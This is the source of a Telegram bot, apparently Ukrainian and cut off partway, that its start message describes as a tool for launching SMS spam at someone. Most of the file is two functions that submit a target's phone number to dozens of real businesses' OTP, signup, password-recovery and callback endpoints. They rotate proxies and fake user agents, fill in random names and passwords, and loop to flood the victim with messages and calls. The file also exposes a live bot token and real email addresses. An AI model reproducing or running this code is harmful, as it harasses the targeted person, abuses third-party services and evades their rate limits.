# -*- coding: utf-8 -*-
from email import message
import requests
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import time
import random
import fake_useragent
from random import choice
import parser_https

TOKEN = '5629678144:AAGcADad3E4a-ry7JagBKFBripJWrxCXmL8'

THREADS_LIMIT = 200

chat_ids_file = 'chat_ids.txt'

ADMIN_CHAT_ID = 5112839866

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []

print('Bot has started! You can use him.')

def save_chat_id(chat_id):
    "Функция добавляет чат айди в файл если его там нету"
    chat_id = str(chat_id)
    with open(chat_ids_file,"a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return


def send_message_users(message):
    #sms_bomber.
    pass

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]
    bot.send_message(ADMIN_CHAT_ID, f"Повідомлення відправлено ({users_amount[0]}) користувачам бота!")


@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    boom = types.KeyboardButton(text='☎️Запуск спама')
    stop = types.KeyboardButton(text='❌Зупинити спам')
    info = types.KeyboardButton(text='🤖Інформація')
    stats = types.KeyboardButton(text='📈Статистика')
    faq = types.KeyboardButton(text='❗️ FAQ')

    buttons_to_add = [boom, stop, info, stats, faq]

    if int(message.chat.id) == ADMIN_CHAT_ID:
        buttons_to_add.append(types.KeyboardButton(text='🔥Розсилка'))
        buttons_to_add.append(types.KeyboardButton(text='addbl'))
        buttons_to_add.append(types.KeyboardButton(text='delbl'))

    keyboard.add(*buttons_to_add)
    bot.send_message(message.chat.id, 'Привіт🙋‍♂!\n\n<b>Завдяки цьому боті ти можеш запустити комусь спам смс</b>\n\n<b>Вибери дію:</b>',  reply_markup=keyboard, parse_mode='HTML')
    save_chat_id(message.chat.id)

def send_for_number_https(aa):

    ua = fake_useragent.UserAgent()
    headers = {
        'user_agent': ua.random
    }

    messages = ['Перезвоніть мені будь ласка', 'хочу поговорити за сам сайт','хочу проконсультоватись','чекаю вашого звінку']

    emails_list = ['prostoegorich2@gmail.com',
          'autoskilz068@gmail.com',
          'maksimbardic@gmail.com',
          'ttgbot.proekt@gmail.com',
          'webmine123@gmail.com']
    email = ''.join([random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')) for m in range(10)]) + '@gmail.com'

    with open('nimes.txt', 'r',encoding='utf-8') as f:
        name = choice(f.read().split())
    with open('surname.txt', 'r',encoding='utf-8') as f:
        surname = choice(f.read().split())
    password = ''.join([random.choice(list('йцукенгшщзфывапролдячсмитьбЙЦУКЕНГШЩЗФЫВАПРОЛДЯЧСМИТЬБ1234567890_')) for m in range(7)])

    uniq_number = f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'
    uniq_number_minus = f'+{aa[:2]}-({aa[2:5]})-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}'
    number_plus = '+' + aa


    no_valid_proxy = []
    valid_proxy = []
    parser_https.run(no_valid_proxy,valid_proxy,6)
    coun = 0
    try:
        proxies = {
            'http': f'http://{valid_proxy[coun]}',
            'https': f'http://{valid_proxy[coun]}'
        }
        print(valid_proxy[coun])
        requests.post('https://ucb.z.apteka24.ua/api/send/otp',headers=headers,proxies=proxies, json={"phone": aa})
        d = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers=headers,proxies=proxies, json={'phone':aa,'platform':'PISWeb'})
        requests.post('https://city-drive.phonet.com.ua/rest/public/widget/call-catchers/15bdee1b-7e69-4a97-b04b-8d96708fe5b5/call?timestamp=166280969timeout=1.5,49&utcOffset=-180',headers=headers,proxies=proxies, json={
        "phone": number_plus,
        "utm": {
            "source": "google",
            "medium": "organic",
            "campaign": "(not set)",
            "content": "(not set)",
            "term": "(not set)"
        },
        "referrer": "https://www.google.com.ua/",
        "telerSessionId": "1d6cfee7-0292-4cab-b3fa-b74d66a45940",
        "uaId": "UA-21322812-1",
        "clientId": "1008992044.1662752535",
        "pageUrl": "https://city-drive.ua/user/register"})
        d = requests.post('https://api.staff-clothes.com/api/v1/send-sms-code?access_token=MDFiNjdiNGFhZjU4ZDU0YzVkMjQ4NDMxYTI5YWM0Y2QzZjQzNjJhYjI4ZjY1ODJlOTZjN2QxMmQxNjM2OTMyNQ&locale=ua&action=register_new_user',headers=headers,proxies=proxies, data={'mobileNumber':aa})
        d = requests.post('https://iq-pizza.eatery.club/site/v1/pre-login', headers=headers, proxies=proxies, timeout=1.5, data={'phone': aa})
        d = requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', headers=headers, proxies=proxies, data={'phone':aa})
        d = requests.post('https://vilki-palki.od.ua/api/secret/generate?lang=russian', headers=headers,proxies=proxies, data={'phone': uniq_number})
        d = requests.post('https://kasta.ua/api/v2/ssr/login-form', headers=headers,proxies=proxies, timeout=1.5, data={'email': number_plus})
        requests.post('https://sundog.production.vidmind.com/sundog/graphql',headers=headers,proxies=proxies, json={
            "operationName": "GenerateOTP",
            "variables": {
                "phoneNumber": aa
                },
            "extensions": {
                "persistedQuery": {
                    "version": 1,
                    "sha256Hash": "09e59b531d78c88983ebbb37807aae4797c43edd03a674a5e08d1480424fb7f9"
                }}})
        requests.post('https://credit7.ua/client/registration/general-information',headers=headers,proxies=proxies, data={'mobile_phone':f'({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'})
        d = requests.post('https://api.creditkasa.ua/public/auth/sendAcceptanceCode',headers=headers,proxies=proxies, json={"mobilePhone": aa})
        requests.post('https://money4you.ua/api/clientRegistration/sendValidationSms',headers=headers,proxies=proxies, json={"phone": number_plus,"firstName": name,"lastName": surname,"fathersName": "Вавааав","udriveEmployee": 'false'})
        d = requests.post('https://my.telegram.org/auth/send_password',headers=headers,proxies=proxies, data={'phone': number_plus})
        d = requests.post('https://anixgroup.pbx.vega.ua/rest/public/widget/call-catchers/24af7d3e-9a1e-4a50-b02c-65b1868dc0fb/call?timestamp=1662909402671&utcOffset=-180',headers=headers,proxies=proxies, json={
        "phone": number_plus,
        "utm": {
            "source": "google",
            "medium": "organic",
            "campaign": "(not set)",
            "content": "(not set)",
            "term": "(not set)"
        },
        "referrer": "https://www.google.com.ua/",
        "telerSessionId": "c8f6cdf7-526a-43d7-a95b-8266650ec620",
        "uaId": "UA-72798timeout=1.5,3-9",
        "clientId": "286334084.1662909385",
        "pageUrl": "https://anix.ua/ua/odnorazovye-elektronnye-sigarety"})
        d = requests.post('https://anc.ua/authorization/auth/v2/register',headers=headers,proxies=proxies, json={'login': f'{number_plus}'})
        d = requests.get(f'https://www.add.ua/brander_smsconfirm_login/send/?telephone=+{aa}&code=&type=sms',headers=headers,proxies=proxies,)
        d = requests.post('https://buketland.phonet.com.ua/rest/public/widget/call-catchers/02a157cf-3c3b-4bbd-9398-92b81a93b12c/call?timestamp=1662908228931&utcOffset=-180',headers=headers,proxies=proxies, timeout=1.5, json={
        "phone": number_plus,
        "utm": {
            "source": "google",
            "medium": "organic",
            "campaign": "(not set)",
            "content": "(not set)",
            "term": "(not set)"
        },
        "referrer": "https://www.google.com.ua/",
        "telerSessionId": "d1b62cfb-b334-47d5-bbf6-95dbb15404a2",
        "uaId": "UA-5timeout=1.5,07303-6",
        "clientId": "1717388277.1662908163",
        "pageUrl": "https://buketland.com.ua/index.php?route=account/success"})
        d = requests.post('https://telemart.ua/auth/',headers=headers,proxies=proxies, timeout=1.5, data={'login': number_plus,'action': 'submitPassword','token': 'st'})
        d = requests.post('https://credit7.ua/client/registration/general-information',headers=headers,proxies=proxies, timeout=1.5, data={'mobile_phone': f'{aa[:2]}{(aa[2:5])}{aa[5:8]} {aa[8:10]} {aa[10:12]}'})
        d = requests.post('https://vandalvape.com.ua/index.php?route=extension/module/sms_reg/SmsCheck',headers=headers,proxies=proxies, data={'phone': f'{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        d = requests.post('https://f.ua/ajax/callback/',headers=headers,proxies=proxies, data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','title': '','url': 'https://f.ua/','mail': '','notes': ''})
        d = requests.get(f'https://c2c.oschadbank.ua/api/sms/aa',headers=headers,proxies=proxies)
        d = requests.post('https://cinemaciti.ua/',headers=headers,proxies=proxies, data={'email': choice(emails_list),'phone': aa,'arraySeats': '','terms_and_conditions': 'on'})
        d = requests.post('https://apidev.color-it.ua/api/auth/code',headers=headers, json={'phone': aa[2:]})
        d = requests.post('https://agro-market.net/ajax/auth.php',headers=headers, proxies=proxies, data={'mode': 'reg','phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','name': name,'email': 'autoskilz068@gmail.com','code': '0','app': 'false'})
        d = requests.post('https://callback.ringostat.net/api/initiateCallback/',headers=headers,proxies=proxies, data={'data[num_to_call]': number_plus,'data[ua_id]': 'UA-82454976-1','data[hash]': '82739324abe17ftimeout=1.5,8bdaa7f9149b423c4b0883a7','data[client_id]': 'timeout=1.5,35316644.1662907751','data[utmz]': '','data[avg_time_to_call]': '60','data[page_url]': 'https://proflowers.ua/st','data[hid]': '8bc602ca-1a0b-43c9-9609-f556ca267timeout=1.5,c','data[verified_user]': '1'})
        d = requests.post('https://money4you.ua/api/clientRegistration/sendValidationSms',headers=headers, proxies=proxies, json={"phone": number_plus,"firstName": name,"lastName": surname,"fathersName": name,"udriveEmployee": 'false'})
        d = requests.post('https://vitok.ua/ua/feedback/headerCallback/',headers=headers,proxies=proxies, data={'cellphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','isAjaxForm': 'headerCallbackForm_IY9DZ','isAjax': '1','unique_id': 'IY9DZ'})
        d = requests.post('https://agrotender.com.ua/buyerreg',headers=headers,proxies=proxies, data={'action': 'send-code','phone': aa})
        d = requests.post('https://elektreka.com.ua/index.php?route=extension/module/callback',headers=headers,proxies=proxies, data={'phone': number_plus,'url_site': 'https://elektreka.com.ua/rozetki-i-vyklyuchateli/?gclid=Cj0KCQjwjvaYBhDlARIsAO8PkE3IaTWJylV7VfA_f0k6DfemVao4cU1w12twNAFB8DPPErFj-FWAsqwaAjy3EALw_wcB','action': 'send'})
        d = requests.post('https://api.bossautoukraine.com.ua/api/v1/orders/bid',headers=headers,proxies=proxies, json={"name": name,"phone": number_plus,"message": "Зв'язатись зараз","to": "semenyuk.c.s@gmail.com","subject": "Зворотній дзвінок : https://bossautoukraine.com.ua/cars/","office": "Стрий, вул. Болехівська 47а","isMobile": 'true'})
        d = requests.post('https://loyalty.vidi.ua/register',headers=headers,proxies=proxies, data={'locale': 'ua','name': name,'lname': surname,'mname': name,'email': email,'phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}', 'password': password})
        d = requests.post('https://automoto.ua/uk/my-office/login',headers=headers,proxies=proxies, json={"phone": f'{aa[:2]} {aa[2:5]} {aa[5:8]}{aa[8:10]}{aa[10:12]}'})
        d = requests.get(f'https://api.eldorado.ua/v1/sign/?login={aa}&step=password-recovery-step&lang=ua',headers=headers,proxies=proxies,)
        d = requests.post('https://synthetic.ua/api/auth/register/',headers=headers,proxies=proxies, json={"mobile_phone": aa,"password": "кнкнккнекне","password_confirm": "кнкнккнекне"})
        d = requests.post('https://api.starylev.com.ua/api/v1.1/sms/sent',headers=headers,proxies=proxies, json={"phone": aa,"email": email})
        d = requests.post('https://veloplaneta.ua/graphql/',headers=headers,proxies=proxies, json={"operationName": "requestFeedbackMutation","variables": {"phone": aa},"query": "mutation requestFeedbackMutation($phone: String!) {\n  feedback {\n    requestFeedback(phone: $phone)\n    __typename\n  }\n}\n"})
        d = requests.post('https://alcoexpert.shop/wp-json/contact-form-7/v1/contact-forms/2165/feedback',headers=headers,proxies=proxies, data={'userphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        d = requests.post('https://api.creditkasa.ua/public/auth/sendAcceptanceCode',headers=headers,proxies=proxies, json={"mobilePhone": aa})
        d = requests.post('https://my.tpozyka.com/registration-handle-1',headers=headers,proxies=proxies, data={'data':f'lastname={surname}&name={name}&phone=%2B{aa[:2]}+({aa[2:5]})+{aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})  
        d = requests.post('https://ticketsbox.com/?route=account/authorization',headers=headers,proxies=proxies, data={'username': aa,'type': 'lost'})
        d = requests.post('https://vchehle.ua/uk/callback',headers=headers,proxies=proxies, data={'page': 'https://vchehle.ua/uk/pages/contacts','name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','message': choice(messages)})
        d = requests.post('https://my.lun.ua/api/user/login',headers=headers,proxies=proxies, json={'login': number_plus})
        d = requests.post('https://vchehle.ua/uk/register',headers=headers,proxies=proxies, data={'email': number_plus,'password': 'gdfgdfgfddgf','password_confirmation': 'gdfgdfgfddgf'})
        d = requests.post('https://api.riel.ua/graphql',headers=headers,proxies=proxies, json={"operationName": "StoreSendSms","variables": {"phone": aa},"query": "mutation StoreSendSms($phone: String) {\n  storeSendSms(phone: $phone)\n}\n"})
        d = requests.post('https://lagrande.com.ua/interactive/ajax.php?zone=site&action=AjaxCallback&task=send&type=HeaderCallback',headers=headers,proxies=proxies, data={'firstname': name,'phone': number_plus})
        d = requests.post('https://pancer.phonet.com.ua/rest/public/widget/call-catchers/a55fd900-92f9-4ac6-89be-3a07c17876c7/call-postponed?timestamp=1663000707689&utcOffset=-180',headers=headers,proxies=proxies, json={
    "phone": number_plus,
    "date": "13-Сентября-2022",
    "time": "10:00",
    "utm": {
        "source": "google",
        "medium": "organic",
        "campaign": "(not set)",
        "content": "(not set)",
        "term": "(not set)"
    },
    "referrer": "https://www.google.com.ua/",
    "telerSessionId": "5a2a4ba1-2145-4695-93c4-5e7898922934",
    "timestamp": 1663052400000,
    "uaId": "UA-53329668-1",
    "clientId": "428965036.1663000448",
    "pageUrl": "https://pancer.com.ua/ua/travmaticheskie-pistolety"})
        d = requests.post('https://safari.dp.ua/ua/feedback/callback',headers=headers,proxies=proxies, data={'firstname': name,'cellphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','isAjaxForm': 'callbackForm','isAjax': 1})
        d = requests.post('https://pcshop.ua/index.php?route=account/register/validateFirstStep',headers=headers,proxies=proxies,data={'lastname': name,'firstname': surname,'email': email,'telephone': aa,'password': '','fax':  '','address_1':  '','city':  '','country_id':''  ,'zone_id':  '','newsletter': 1})
        d = requests.post('https://vest.in.ua/index.php?route=extension/module/oct_popup_call_phone/send',headers=headers,proxies=proxies,data={'referer': 'https://vest.in.ua/ua/tehnika-i-elektronika/category-compyuterna-pereferiya/categoria-klaviatura/?gclid=CjwKCAjwsfuYBhAZEiwA5a6CDBmbIgBvL5q4ku4tRhYzu3o9povZONfxRVsiTVmBjnZKTad1TT95zhoC-pQQAvD_BwE','telephone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        d = requests.post('https://elmir.ua/response/load_json.php',headers=headers,proxies=proxies,data={'cb_phone': f'{aa[2:5]}-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}','day': 'd255','hour': 'h9','minute': 'm0','later': 1,'url': 'https://elmir.ua/keyboard/','type': 'callback','state': 'call'})
        d = requests.post('https://kvshop.com.ua/callrequest',headers=headers,proxies=proxies,json={"name": name,"phone": f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        d = requests.get(f'https://touch.com.ua/ajax.php?act=getCallback&phone={aa}',proxies=proxies)
        d = requests.post('https://anixgroup.pbx.vega.ua/rest/public/widget/call-catchers/24af7d3e-9a1e-4a50-b02c-65b1868dc0fb/call-postponed?timestamp=1663019019605&utcOffset=-180',headers=headers,data={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "c8f6cdf7-526a-43d7-a95b-8266650ec620","timestamp": 1663048800000,"uaId": "UA-72798113-9","clientId": "286334084.1662909385","pageUrl": "https://anix.ua/ua/elf-bar"})
        d = requests.post('https://www.mandrivnik.com.ua/ajax/callMe.php',headers=headers,proxies=proxies,data={'un': name,'uph': number_plus})
        d = requests.post('https://steko.phonet.com.ua/rest/public/widget/call-catchers/a9ed83ce-75fe-4f52-bada-8a0fe7247f0a/call-postponed?timestamp=1663020130539&utcOffset=-180',headers=headers,json={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "cpc","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "3619279d-10b7-478e-a098-e71656bbf774","timestamp": 1663048800000,"uaId": "UA-45617472-4","clientId": "1754693290.1663020106","pageUrl": "https://online.steko.com.ua/?gclid=CjwKCAjwsfuYBhAZEiwA5a6CDGM6GLpYdA28DzU6e5R-dGncNeEJJWgd0NurEpl4yTB-yVxqp8apKBoCTr0QAvD_BwE"})
        d = requests.post('https://denika.ua/index.php?route=extension/callback/callback_phone/send',headers=headers,proxies=proxies,data={'data[name]': name,'data[phone]': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        d = requests.post('https://agat-m.com.ua/send.php',headers=headers,proxies=proxies,data={'name': name,'phone': number_plus})
        d = requests.get(f'https://bond.od.ua/newclient///?phone=+{aa}',headers=headers,proxies=proxies)
        d = requests.post('https://megasport.ua/api/feedback/sendCallback/?language=ua',headers=headers,proxies=proxies,json={"phone": number_plus})
        d = requests.post('https://megasport.ua/api/auth/phone/?language=ua',headers=headers,proxies=proxies,json={'phone': number_plus})
        coun+=1
        print(f'Круг {coun}')
    except:
        coun+=1
    print('все')

def send_for_number(aa):
    ua = fake_useragent.UserAgent()
    headers = {
        'user_agent': ua.random
    }

    messages = ['Перезвоніть мені будь ласка', 'хочу поговорити за сам сайт','хочу проконсультоватись','чекаю вашого звінку']

    emails_list = ['prostoegorich2@gmail.com',
          'autoskilz068@gmail.com',
          'maksimbardic@gmail.com',
          'ttgbot.proekt@gmail.com',
          'webmine123@gmail.com']
    email = ''.join([random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')) for m in range(10)]) + '@gmail.com'

    with open('nimes.txt', 'r',encoding='utf-8') as f:
        name = choice(f.read().split())
    with open('surname.txt', 'r',encoding='utf-8') as f:
        surname = choice(f.read().split())
    password = ''.join([random.choice(list('йцукенгшщзфывапролдячсмитьбЙЦУКЕНГШЩЗФЫВАПРОЛДЯЧСМИТЬБ1234567890_')) for m in range(7)])

    uniq_number = f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'
    uniq_number_minus = f'+{aa[:2]}-({aa[2:5]})-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}'
    number_plus = '+' + aa

    try:
        requests.post('https://ucb.z.apteka24.ua/api/send/otp',headers=headers, json={"phone": aa})
        d = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers=headers, json={'phone':aa,'platform':'PISWeb'})
        requests.post('https://city-drive.phonet.com.ua/rest/public/widget/call-catchers/15bdee1b-7e69-4a97-b04b-8d96708fe5b5/call?timestamp=166280969timeout=1.5,49&utcOffset=-180',headers=headers, json={
        "phone": number_plus,
        "utm": {
            "source": "google",
            "medium": "organic",
            "campaign": "(not set)",
            "content": "(not set)",
            "term": "(not set)"
        },
        "referrer": "https://www.google.com.ua/",
        "telerSessionId": "1d6cfee7-0292-4cab-b3fa-b74d66a45940",
        "uaId": "UA-21322812-1",
        "clientId": "1008992044.1662752535",
        "pageUrl": "https://city-drive.ua/user/register"})
        d = requests.post('https://api.staff-clothes.com/api/v1/send-sms-code?access_token=MDFiNjdiNGFhZjU4ZDU0YzVkMjQ4NDMxYTI5YWM0Y2QzZjQzNjJhYjI4ZjY1ODJlOTZjN2QxMmQxNjM2OTMyNQ&locale=ua&action=register_new_user',headers=headers,data={'mobileNumber':aa})
        d = requests.post('https://iq-pizza.eatery.club/site/v1/pre-login', headers=headers, data={'phone': aa})
        d = requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', headers=headers, data={'phone':aa})
        d = requests.post('https://vilki-palki.od.ua/api/secret/generate?lang=russian', headers=headers, data={'phone': uniq_number})
        d = requests.post('https://kasta.ua/api/v2/ssr/login-form', headers=headers, data={'email': number_plus})
        requests.post('https://sundog.production.vidmind.com/sundog/graphql',headers=headers, json={
                "operationName": "GenerateOTP",
                "variables": {
                    "phoneNumber": aa
                    },
                "extensions": {
                    "persistedQuery": {
                        "version": 1,
                        "sha256Hash": "09e59b531d78c88983ebbb37807aae4797c43edd03a674a5e08d1480424fb7f9"
                    }}})
        requests.post('https://credit7.ua/client/registration/general-information',headers=headers, data={'mobile_phone':f'({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'})
        d = requests.post('https://api.creditkasa.ua/public/auth/sendAcceptanceCode',headers=headers,json={"mobilePhone": aa})
        requests.post('https://money4you.ua/api/clientRegistration/sendValidationSms',headers=headers,json={"phone": number_plus,"firstName": name,"lastName": surname,"fathersName": "Вавааав","udriveEmployee": 'false'})
        d = requests.post('https://my.telegram.org/auth/send_password',headers=headers,data={'phone': number_plus})
        d = requests.post('https://anixgroup.pbx.vega.ua/rest/public/widget/call-catchers/24af7d3e-9a1e-4a50-b02c-65b1868dc0fb/call?timestamp=1662909402671&utcOffset=-180',headers=headers,json={
            "phone": number_plus,
            "utm": {
                "source": "google",
                "medium": "organic",
                "campaign": "(not set)",
                "content": "(not set)",
                "term": "(not set)"
            },
            "referrer": "https://www.google.com.ua/",
            "telerSessionId": "c8f6cdf7-526a-43d7-a95b-8266650ec620",
            "uaId": "UA-72798timeout=1.5,3-9",
            "clientId": "286334084.1662909385",
            "pageUrl": "https://anix.ua/ua/odnorazovye-elektronnye-sigarety"})
        d = requests.post('https://anc.ua/authorization/auth/v2/register',headers=headers,json={'login': f'{number_plus}'})
        d = requests.get(f'https://www.add.ua/brander_smsconfirm_login/send/?telephone=+{aa}&code=&type=sms',headers=headers)
        d = requests.post('https://buketland.phonet.com.ua/rest/public/widget/call-catchers/02a157cf-3c3b-4bbd-9398-92b81a93b12c/call?timestamp=1662908228931&utcOffset=-180',headers=headers,json={
            "phone": number_plus,
            "utm": {
                "source": "google",
                "medium": "organic",
                "campaign": "(not set)",
                "content": "(not set)",
                "term": "(not set)"
            },
            "referrer": "https://www.google.com.ua/",
            "telerSessionId": "d1b62cfb-b334-47d5-bbf6-95dbb15404a2",
            "uaId": "UA-5timeout=1.5,07303-6",
            "clientId": "1717388277.1662908163",
            "pageUrl": "https://buketland.com.ua/index.php?route=account/success"})
        d = requests.post('https://telemart.ua/auth/',headers=headers,data={'login': number_plus,'action': 'submitPassword','token': 'st'})
        d = requests.post('https://credit7.ua/client/registration/general-information',headers=headers,data={'mobile_phone': f'{aa[:2]}{(aa[2:5])}{aa[5:8]} {aa[8:10]} {aa[10:12]}'})
        d = requests.post('https://vandalvape.com.ua/index.php?route=extension/module/sms_reg/SmsCheck',headers=headers, data={'phone': f'{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        d = requests.post('https://f.ua/ajax/callback/',headers=headers, data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','title': '','url': 'https://f.ua/','mail': '','notes': ''})
        d = requests.get(f'https://c2c.oschadbank.ua/api/sms/aa',headers=headers)
        d = requests.post('https://cinemaciti.ua/',headers=headers,data={'email': choice(emails_list),'phone': aa,'arraySeats': '','terms_and_conditions': 'on'})
        d = requests.post('https://apidev.color-it.ua/api/auth/code',headers=headers,json={'phone': aa[2:]})
        d = requests.post('https://agro-market.net/ajax/auth.php',headers=headers, data={'mode': 'reg','phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','name': name,'email': 'autoskilz068@gmail.com','code': '0','app': 'false'})
        d = requests.post('https://callback.ringostat.net/api/initiateCallback/',headers=headers,data={'data[num_to_call]': number_plus,'data[ua_id]': 'UA-82454976-1','data[hash]': '82739324abe17ftimeout=1.5,8bdaa7f9149b423c4b0883a7','data[client_id]': 'timeout=1.5,35316644.1662907751','data[utmz]': '','data[avg_time_to_call]': '60','data[page_url]': 'https://proflowers.ua/st','data[hid]': '8bc602ca-1a0b-43c9-9609-f556ca267timeout=1.5,c','data[verified_user]': '1'})
        d = requests.post('https://money4you.ua/api/clientRegistration/sendValidationSms',headers=headers, json={"phone": number_plus,"firstName": name,"lastName": surname,"fathersName": name,"udriveEmployee": 'false'})
        d = requests.post('https://vitok.ua/ua/feedback/headerCallback/',headers=headers,data={'cellphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','isAjaxForm': 'headerCallbackForm_IY9DZ','isAjax': '1','unique_id': 'IY9DZ'})
        d = requests.post('https://agrotender.com.ua/buyerreg',headers=headers,data={'action': 'send-code','phone': aa})
        d = requests.post('https://elektreka.com.ua/index.php?route=extension/module/callback',headers=headers,data={'phone': number_plus,'url_site': 'https://elektreka.com.ua/rozetki-i-vyklyuchateli/?gclid=Cj0KCQjwjvaYBhDlARIsAO8PkE3IaTWJylV7VfA_f0k6DfemVao4cU1w12twNAFB8DPPErFj-FWAsqwaAjy3EALw_wcB','action': 'send'})
        d = requests.post('https://api.bossautoukraine.com.ua/api/v1/orders/bid',headers=headers,json={"name": name,"phone": number_plus,"message": "Зв'язатись зараз","to": "semenyuk.c.s@gmail.com","subject": "Зворотній дзвінок : https://bossautoukraine.com.ua/cars/","office": "Стрий, вул. Болехівська 47а","isMobile": 'true'})
        d = requests.post('https://loyalty.vidi.ua/register',headers=headers,data={'locale': 'ua','name': name,'lname': surname,'mname': name,'email': email,'phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}', 'password': password})
        d = requests.post('https://automoto.ua/uk/my-office/login',headers=headers,json={"phone": f'{aa[:2]} {aa[2:5]} {aa[5:8]}{aa[8:10]}{aa[10:12]}'})
        d = requests.get(f'https://api.eldorado.ua/v1/sign/?login={aa}&step=password-recovery-step&lang=ua',headers=headers)
        d = requests.post('https://synthetic.ua/api/auth/register/',headers=headers,json={"mobile_phone": aa,"password": "кнкнккнекне","password_confirm": "кнкнккнекне"})
        d = requests.post('https://api.starylev.com.ua/api/v1.1/sms/sent',headers=headers,json={"phone": aa,"email": email})
        d = requests.post('https://veloplaneta.ua/graphql/',headers=headers,json={"operationName": "requestFeedbackMutation","variables": {"phone": aa},"query": "mutation requestFeedbackMutation($phone: String!) {\n  feedback {\n    requestFeedback(phone: $phone)\n    __typename\n  }\n}\n"})
        d = requests.post('https://alcoexpert.shop/wp-json/contact-form-7/v1/contact-forms/2165/feedback',headers=headers,data={'userphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        d = requests.post('https://api.creditkasa.ua/public/auth/sendAcceptanceCode',headers=headers,json={"mobilePhone": aa})
        d = requests.post('https://my.tpozyka.com/registration-handle-1',headers=headers,data={'data':f'lastname={surname}&name={name}&phone=%2B{aa[:2]}+({aa[2:5]})+{aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        d = requests.post('https://ticketsbox.com/?route=account/authorization',headers=headers, data={'username': aa,'type': 'lost'})
        d = requests.post('https://vchehle.ua/uk/callback',headers=headers, data={'page': 'https://vchehle.ua/uk/pages/contacts','name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','message': choice(messages)})
        d = requests.post('https://vchehle.ua/uk/register',headers=headers, data={'email': number_plus,'password': 'gdfgdfgfddgf','password_confirmation': 'gdfgdfgfddgf'})
        d = requests.post('https://my.lun.ua/api/user/login',headers=headers, json={'login': number_plus})
        d = requests.post('https://api.riel.ua/graphql',headers=headers, json={"operationName": "StoreSendSms","variables": {"phone": aa},"query": "mutation StoreSendSms($phone: String) {\n  storeSendSms(phone: $phone)\n}\n"})
        d = requests.post('https://lagrande.com.ua/interactive/ajax.php?zone=site&action=AjaxCallback&task=send&type=HeaderCallback',headers=headers, data={'firstname': name,'phone': number_plus})
        d = requests.post('https://pancer.phonet.com.ua/rest/public/widget/call-catchers/a55fd900-92f9-4ac6-89be-3a07c17876c7/call-postponed?timestamp=1663000707689&utcOffset=-180',headers=headers, json={
    "phone": number_plus,
    "date": "13-Сентября-2022",
    "time": "10:00",
    "utm": {
        "source": "google",
        "medium": "organic",
        "campaign": "(not set)",
        "content": "(not set)",
        "term": "(not set)"
    },
    "referrer": "https://www.google.com.ua/",
    "telerSessionId": "5a2a4ba1-2145-4695-93c4-5e7898922934",
    "timestamp": 1663052400000,
